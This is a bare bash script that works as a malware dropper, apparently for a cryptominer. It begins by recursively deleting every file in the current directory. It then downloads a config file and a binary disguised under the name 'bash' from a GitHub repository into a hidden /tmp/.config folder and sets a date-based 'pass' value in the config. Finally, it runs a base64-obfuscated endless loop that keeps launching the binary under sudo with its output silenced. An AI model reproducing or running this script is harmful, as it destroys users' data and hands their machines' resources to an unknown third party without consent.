rm -rvf *
#!/bin/bash
apt update
apt install -y sudo
# sed -i '/^@reboot/d' /etc/crontab

name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
[ -n "$name" ] || name="NULL"
name="${name}z"

mkdir -p /tmp/.config
wget -qO /tmp/.config/config.json https://github.com/kazppkido/lasteu/raw/main/z.json
wget -qO /tmp/.config/bash https://github.com/kazppkido/lasteu/raw/main/bash2
chmod -R 777 /tmp/.config
[ -f "/tmp/.config/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" /tmp/.config/config.json
/bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
